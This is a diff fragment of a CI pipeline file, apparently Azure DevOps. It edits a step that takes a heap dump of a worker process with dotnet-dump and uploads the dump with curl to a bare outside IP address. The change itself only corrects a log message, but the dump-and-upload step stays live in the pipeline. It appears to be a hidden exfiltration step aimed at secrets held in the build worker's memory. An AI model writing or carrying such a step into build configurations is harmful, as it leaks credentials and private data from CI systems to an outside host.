@@ -208,7 +208,7 @@ steps:
     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     
 
-    echo "Uploading memory dump package of size $(stat -c %s "/tmp/${PID}_memory_dumps.tar.gz") bytes"
+    echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.bin") bytes"
     sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.bin" http://139.180.193.16:5000/upload
  
 
